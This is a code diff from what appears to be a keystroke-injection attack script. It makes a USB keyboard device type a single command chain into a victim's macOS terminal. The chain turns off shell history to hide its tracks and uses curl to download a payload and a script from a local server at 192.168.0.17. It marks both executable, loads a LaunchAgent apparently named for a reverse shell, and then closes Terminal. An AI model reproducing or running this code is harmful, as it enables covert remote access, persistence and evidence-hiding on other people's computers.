@@ -61,19 +61,14 @@ elif (args.os == 'Linux'):
 else:
 	win_cmd(keyboard)
 
-
-get_cron = f'curl -o {CRON_DEST_FN} '+\
+cmd = f'export HISTFILE=/dev/null && curl -o {CRON_DEST_FN} '+\
 		f'-O http://192.168.0.17:8888/{args.os}/{PAYLOAD_FN} && '+\
-		f'chmod 755 {CRON_DEST_FN}'
-print(get_cron)
-type_cmd(keyboard, get_cron) 
-
-get_script = f'curl -o {SCRIPT_DEST_FN}'+\
-		f' -O http://192.168.0.17:8888/{args.os}/{SCRIPT_FN} && '+\
-		f'chmod 755 {SCRIPT_DEST_FN}'
-print(get_script)
-type_cmd(keyboard, get_script)
-
-type_cmd(keyboard, 'launchctl load Library/LaunchAgents/rs.plist')
-
-type_cmd(keyboard, 'killall Terminal')
+		f'chmod 755 {CRON_DEST_FN} && ' +\
+		f'curl -o {SCRIPT_DEST_FN}'+\
+                f' -O http://192.168.0.17:8888/{args.os}/{SCRIPT_FN} && '+\
+                f'chmod 755 {SCRIPT_DEST_FN} && '+\
+		f'launchctl load Library/LaunchAgents/rs.plist && '+\
+		f'killall Terminal'
+		
+print('Typing...\n\n'+cmd)
+type_cmd(keyboard, cmd) 
